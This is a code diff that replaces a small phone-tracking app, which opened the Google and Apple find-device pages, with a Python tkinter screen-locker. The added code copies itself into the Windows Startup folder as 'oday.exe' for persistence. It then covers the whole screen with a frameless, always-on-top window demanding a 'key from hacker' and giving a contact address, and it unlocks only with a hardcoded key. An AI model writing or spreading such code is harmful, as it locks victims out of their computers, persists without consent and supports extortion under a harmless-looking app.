@@ -1,31 +1,61 @@
-import flet as ft
-import webbrowser
+import tkinter as tk
+from tkinter import messagebox
+import os
+import sys
+import shutil
+import threading
 
-def main(page: ft.Page):
-    page.title = "تتبع الهاتف"
-    page.vertical_alignment = ft.MainAxisAlignment.CENTER
-    page.padding = 30
 
-    def open_android_tracker(e):
-        webbrowser.open("https://www.google.com/android/find")
+# تحديد مسار التطبيق
+path_app = os.path.abspath(sys.argv[0])
 
-    def open_apple_tracker(e):
-        webbrowser.open("https://www.icloud.com/find")
+# تحديد مجلد البداية في قائمة "ابدأ"
+run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+name = os.path.join(run_start, "oday.exe")
 
-    title = ft.Text("اختر نوع جهازك لتتبع الهاتف", size=20, weight=ft.FontWeight.BOLD, text_align=ft.TextAlign.CENTER)
-    android_button = ft.ElevatedButton("هاتف أندرويد", on_click=open_android_tracker, width=250, height=50, bgcolor=ft.colors.GREEN_600, color=ft.colors.WHITE)
-    apple_button = ft.ElevatedButton("هاتف آيفون", on_click=open_apple_tracker, width=250, height=50, bgcolor=ft.colors.BLUE_600, color=ft.colors.WHITE)
-    footer = ft.Text("هذه الخدمة تعتمد على مواقع Google و Apple الرسمية", size=12, color=ft.colors.GREY)
+# إذا لم يكن التطبيق موجودًا في المجلد، قم بنسخه
+if not os.path.exists(name):
+    shutil.copy(path_app, name)
 
-    page.add(
-        title,
-        ft.Column(
-            [android_button, apple_button],
-            alignment=ft.MainAxisAlignment.CENTER,
-            horizontal_alignment=ft.CrossAxisAlignment.CENTER,
-            spacing=20,
-        ),
-        footer
-    )
+# دالة للخروج من التطبيق
+def exit_app():
+    root.destroy()
 
-ft.app(target=main)
+# دالة للتحقق من المفتاح المدخل
+def clos(event=None):
+    key = "1234567"
+    if entry.get() == key:
+        exit_app()
+    else:
+        messagebox.showerror("Don't play with me", "The key is wrong")
+
+# إعداد واجهة المستخدم
+root = tk.Tk()
+
+# إخفاء إطار النافذة
+root.overrideredirect(True)
+root.attributes("-topmost", True)
+
+# إضافة النصوص والعناصر
+tk.Label(root, text="Enter the key from hacker:", bg="green", fg="black").pack()
+
+entry = tk.Entry(root, width=50, border=0)
+entry.pack(pady=20)
+
+b = tk.Button(root, text="Submit", command=clos)
+b.pack()
+
+root.config(background="green")
+root.resizable(False, False)
+
+# جعل نافذة التطبيق تغطي الشاشة بالكامل
+root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
+root.title("Keno")
+
+tk.Label(root, text="hack@gmail.com", bg="green", fg="black").pack(pady=20)
+
+# استدعاء الدالة clos عند الضغط على Enter أو الزر Submit
+entry.bind("<Return>", clos)
+
+# تشغيل نافذة tkinter
+root.mainloop()
